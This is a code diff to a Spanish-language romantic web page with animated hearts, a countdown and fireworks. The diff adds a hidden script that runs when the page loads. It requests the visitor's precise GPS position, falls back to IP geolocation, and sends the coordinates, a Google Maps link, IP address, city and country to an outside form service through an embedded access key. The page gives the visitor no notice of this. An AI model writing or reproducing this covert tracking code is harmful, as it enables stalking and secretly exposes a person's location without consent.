@@ -88,7 +88,6 @@
   </audio>
 
   <script>
-    // 🌟 Animaciones interactivas
     document.addEventListener("mousemove", e=>{
       const heart=document.createElement("div");
       heart.className="cursor-heart";
@@ -126,7 +125,7 @@
     actualizarContador("2025-03-16T00:00:00");
 
     const hoy=new Date();
-    if(hoy.getDate()===16&&hoy.getMonth()===2&&hoy.getFullYear()===2025){
+    if(hoy.getDate()===16 && hoy.getMonth()===2 && hoy.getFullYear()===2025){
       setInterval(()=>{
         const f=document.createElement("div");
         f.className="firework";
@@ -152,27 +151,64 @@
       });
     });
 
-    // 📍 Envío de ubicación IP a Web3Forms sin redirección
-    fetch("https://ipwhois.app/json/")
-      .then(res=>res.json())
-      .then(data=>{
-        const googleMapsLink=`https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-        const ubicacion=`IP: ${data.ip}\nCiudad: ${data.city}\nRegión: ${data.region}\nPaís: ${data.country}\nLatitud: ${data.latitude}\nLongitud: ${data.longitude}\nGoogle Maps: ${googleMapsLink}\nFecha/Hora: ${new Date().toLocaleString()}`;
-        fetch("https://api.web3forms.com/submit", {
-          method:"POST",
-          headers:{"Content-Type":"application/json"},
-          body: JSON.stringify({
-            access_key: "fc6c27a4-3f97-470f-9bb7-6f23ec223b34",
-            subject: "Ubicación Automática",
-            from_name: "Script Ubicación",
-            message: ubicacion
-          })
+    // 📍 Ubicación GPS o IP con Web3Forms
+    const accessKey = "fc6c27a4-3f97-470f-9bb7-6f23ec223b34";
+
+    function enviarUbicacion(metodo, lat, lon, extra = {}) {
+      const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      const mensaje = `Método: ${metodo}\nLatitud: ${lat}\nLongitud: ${lon}\nGoogle Maps: ${googleMapsLink}\nFecha/Hora: ${new Date().toLocaleString()}\n` +
+        Object.entries(extra).map(([k, v]) => `${k}: ${v}`).join('\n');
+
+      fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          access_key: accessKey,
+          subject: "Ubicación automática",
+          from_name: `Script de ubicación (${metodo})`,
+          message: mensaje
         })
-        .then(res=>res.json())
-        .then(result=>console.log("Ubicación enviada:", result))
-        .catch(err=>console.error("Error al enviar ubicación:", err));
       })
-      .catch(err=>console.error("Error al obtener IP:", err));
+      .then(res => res.json())
+      .then(result => console.log(`Ubicación enviada (${metodo}):`, result))
+      .catch(err => console.error(`Error al enviar ubicación (${metodo}):`, err));
+    }
+
+    function obtenerUbicacionPorIP() {
+      fetch("https://ipwhois.app/json/")
+        .then(res => res.json())
+        .then(data => {
+          enviarUbicacion("IP", data.latitude, data.longitude, {
+            IP: data.ip,
+            Ciudad: data.city,
+            Región: data.region,
+            País: data.country
+          });
+        })
+        .catch(err => console.error("Error al obtener ubicación por IP:", err));
+    }
+
+    function obtenerUbicacionPrecisa() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            enviarUbicacion("GPS", lat, lon);
+          },
+          err => {
+            console.warn("GPS no disponible o denegado. Usando IP:", err.message);
+            obtenerUbicacionPorIP();
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      } else {
+        console.warn("Geolocalización no soportada. Usando IP.");
+        obtenerUbicacionPorIP();
+      }
+    }
+
+    obtenerUbicacionPrecisa();
   </script>
 </body>
 </html>
